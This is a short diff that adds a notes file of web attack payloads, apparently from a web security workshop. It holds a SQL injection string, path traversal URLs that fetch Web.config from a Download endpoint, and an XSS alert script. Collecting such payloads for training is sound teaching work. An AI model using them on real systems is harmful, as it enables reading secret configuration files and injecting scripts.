@@ -1,0 +1,9 @@
+test' or 1=1 --
+
+http://localhost:50809/Download/Download?path=~%2FWeb.config
+http://workshoponwebsecurity.azurewebsites.net/Download/Download?path=../Web.config
+
+http://workshoponwebsecurity.azurewebsites.net/Download/Download?path=~%2FWeb.config
+
+ 
+<script type="text/javascript"> alert(''You are hacked'');</script>
